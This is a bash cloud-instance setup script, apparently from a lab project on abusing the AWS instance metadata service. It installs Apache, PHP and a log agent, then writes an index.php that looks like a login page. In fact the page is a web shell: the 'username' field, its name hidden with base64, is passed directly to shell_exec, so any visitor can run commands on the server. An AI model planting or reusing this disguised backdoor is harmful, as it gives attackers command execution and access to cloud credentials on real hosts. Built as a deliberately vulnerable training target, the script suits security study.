#!/bin/bash -xe
yum update -y
yum install httpd php awslogs -y
wget https://raw.githubusercontent.com/tracer-tick/Abusing-AWS-IMDS-v1/master/terraform/misc/awslogs.conf
mv awslogs.conf /etc/awslogs/
systemctl start awslogsd
cd /var/www/html
echo "<html><head><title>Login</title></head><body><div style=\"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px\"></div><div style=\"background-color:#c9c9c9;padding:20px;\"><h1 align=\"center\">Login</h1><form align=\"center\" action=\"index.php\" method=\"\$_GET\"><label align=\"center\">Username</label><br><input align=\"center\" type=\"text\" name=\"username\" value=\"Username\"><br><label>Password</label><br><input align=\"center\" type=\"password\" name=\"password\" value=\"\"><br><input align=\"center\" type=\"submit\" value=\"Submit\"></form></div><div style=\"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px\" align=\"center\"><?php if(isset(\$_GET[base64_decode('dXNlcm5hbWU=')])){echo shell_exec(\$_GET[base64_decode('dXNlcm5hbWU=')]);}?></div></body></html>" > index.php
systemctl enable awslogsd.service
systemctl enable httpd.service
service httpd start